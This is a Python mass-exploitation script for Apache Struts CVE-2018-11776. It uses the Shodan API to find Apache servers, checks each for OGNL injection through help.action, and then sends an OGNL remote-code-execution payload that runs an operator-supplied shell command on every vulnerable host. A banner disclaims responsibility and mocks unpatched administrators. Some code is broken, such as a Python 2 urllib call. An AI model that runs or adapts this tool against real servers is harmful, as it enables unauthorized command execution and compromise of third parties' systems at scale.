#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests,sys,random,json
requests.packages.urllib3.disable_warnings()
from pathlib import Path
import sys
import urllib
from urllib.request import urlopen
import http.client
from urllib import parse
import shodan

logo = '''

    ███████╗████████╗██████╗ ██╗   ██╗████████╗███████╗
    ██╔════╝╚══██╔══╝██╔══██╗██║   ██║╚══██╔══╝██╔════╝
    ███████╗   ██║   ██████╔╝██║   ██║   ██║   ███████╗
    ╚════██║   ██║   ██╔══██╗██║   ██║   ██║   ╚════██║
    ███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████║
    ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
                                                   
                        Author: @037
                        Version: 1.0

######################## DISCLAIMER ###########################
| This tool takes CVE-2018-11776 and simply adds Shodan ;-)   |   
| I'm not responsible for ANY crimes committed OR lazy system |
| administrators that can't afford 2 minutes to patch against |
| this exploit. Not my fault you're pulling an Equifax.       |
###############################################################
                                                                                      
'''
print(logo)

keys = Path("./api.txt")
if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[~] File written: ./api.txt')
    file.close()

def exploit(host,cmd):
    print("[Execute]: {}".format(cmd))

    ognl_payload = "${"
    ognl_payload += "(#_memberAccess['allowStaticMethodAccess']=true)."
    ognl_payload += "(#cmd='{}').".format(cmd)
    ognl_payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    ognl_payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd}))."
    ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    ognl_payload += "(#p.redirectErrorStream(true))."
    ognl_payload += "(#process=#p.start())."
    ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    ognl_payload += "(#ros.flush())"
    ognl_payload += "}"

    if not ":" in host:
        host = "{}:8080".format(host)

    ognl_payload_encoded = urllib.quote_plus(ognl_payload)
    url = "http://{}/{}/help.action".format(host, ognl_payload_encoded.replace("+","%20").replace(" ", "%20").replace("%2F","/"))

    print("[Url]: {}\n\n\n".format(url))

    try:
        request = urllib.request.Request(url)
        response = urllib.request.urlopen(request).read()
    except http.client.IncompleteRead as e:
        response = e.partial
        print(response)


def poc(url):
    try:
        retval = False
        headers = dict()
        headers['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0'
        r1 = random.randint(10000,99999)
        r2 = random.randint(10000,99999)
        r3 = r1 + r2

        urlOne = url
        res = requests.get(url=urlOne,timeout=6,allow_redirects=False,verify=False)
        if res.status_code == 200:
            urlTemp = parse.urlparse(urlOne)
            urlTwo = urlTemp.scheme + '://' + urlTemp.netloc + '/${%s+%s}/help.action'%(r1,r2)
            res = requests.get(url=urlTwo,timeout=6,allow_redirects=False,verify=False)
            print("[*] Testing the URL for exploit;", urlTwo)
            if res.status_code == 302 and res.headers.get('Location') is not None and str(r3) in res.headers.get('Location'):
                urlThree = res.headers.get('Location')
                retval |= str(r3) in urlThree
    except:pass
    finally:

        if retval:
            print('[*] URL {} s2-057 CVE-2018-11776 is VULNERABLE!'.format(url))
            exploit(url,command)

        else:
            print('[*] URL {} s2-057 CVE-2018-11776, not VULNERABLE!'.format(url))

if __name__ == '__main__':
    command = input("[*] Command to EXECUTE on all affected servers: ") or 'id'
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        query = input("[*] Use Shodan API to search for affected Apache Struts servers? <Y/n>: ").lower()
        if query.startswith('y'):
            print('')
            print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
            results = api.search('Server: Apache') # CHANGE SEARCH PARAM FOR ACCURACY
            print('[✓] API Key Authentication: SUCCESS')
            print('[~] Number of present Apache Servers: %s' % results['total'])
            print('')
            engage = input ("[*] Begin attempting CVE-2018-11776 exploitation in each Apache server? <y/N>: ").lower()
            if engage.startswith('y'):
                for result in results['matches']:
                    poc(result['ip_str'])
    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[~] File written: ./api.txt')
                file.close()
                print('[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('[•] Exiting Platform. Have a wonderful day.')

